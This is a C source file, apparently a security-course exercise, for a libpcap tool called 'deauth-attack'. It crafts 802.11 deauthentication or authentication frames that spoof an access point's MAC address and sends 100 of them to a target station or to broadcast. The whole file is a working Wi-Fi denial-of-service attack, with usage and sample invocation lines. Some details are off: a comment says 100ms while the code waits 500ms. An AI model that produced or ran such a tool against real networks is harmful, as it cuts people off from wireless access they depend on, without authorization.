#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <unistd.h>

// 패킷 생성 함수
void create_frame(unsigned char *frame, const char *ap_mac, const char *station_mac, int is_auth) {
    memset(frame, 0, 128);

    // 802.11 Frame Control
    frame[0] = is_auth ? 0xb0 : 0xc0;  // Authentication: 0xb0, Deauthentication: 0xc0
    frame[1] = 0x00;

    // Duration
    frame[2] = 0x3a;
    frame[3] = 0x01;

    // Receiver Address (Station MAC or Broadcast)
    if (station_mac) {
        sscanf(station_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &frame[4], &frame[5], &frame[6], &frame[7], &frame[8], &frame[9]);
    } else {
        memset(frame + 4, 0xff, 6);  // Broadcast
    }

    // Transmitter Address (AP MAC)
    sscanf(ap_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &frame[10], &frame[11], &frame[12], &frame[13], &frame[14], &frame[15]);

    // BSSID (AP MAC)
    sscanf(ap_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &frame[16], &frame[17], &frame[18], &frame[19], &frame[20], &frame[21]);

    // Fragment & Sequence Number
    frame[22] = 0x00;
    frame[23] = 0x00;

    // Reason Code or Authentication Algorithm <- fixed
        frame[24] = 0x00;
    frame[25] = is_auth ? 0x00 : 0x07;  // 0x07 for Deauthentication, 0x00 for Open System Auth

}

// 패킷 데이터를 16진수로 출력하는 함수
void print_packet(const unsigned char *packet, size_t length) {
    printf("Packet data (length: %zu):\n", length);
    for (size_t i = 0; i < length; i++) {
        printf("%02x ", packet[i]);  // 16진수로 출력
        if ((i + 1) % 16 == 0) {    // 16바이트마다 줄 바꿈
            printf("\n");
        }
    }
    if (length % 16 != 0) {
        printf("\n");
    }
}


int main(int argc, char *argv[]) {
    if (argc < 3 || argc > 5) {
        fprintf(stderr, "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
        fprintf(stderr, "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
        return -1;
    }

    const char *interface = argv[1];
    const char *ap_mac = argv[2];
    const char *station_mac = (argc >= 4 && strcmp(argv[3], "-auth") != 0) ? argv[3] : NULL;
    int is_auth = (argc == 5 && strcmp(argv[4], "-auth") == 0);

    // libpcap 설정
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Could not open device %s: %s\n", interface, errbuf);
        return -1;
    }

    // 패킷 생성
    unsigned char packet[128];
    create_frame(packet, ap_mac, station_mac, is_auth);

    //확인
    // printf("Packet before sending:\n");
    // print_packet(packet, sizeof(packet));

    // 패킷 전송
    printf("Sending %s packets...\n", is_auth ? "Authentication" : "Deauthentication");
    for (int i = 0; i < 100; i++) {  // 100번 전송
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
        } else {
            printf("Packet %d sent\n", i + 1);
        }
        usleep(500000);  // 100ms 대기
    }

    pcap_close(handle);
    return 0;
}
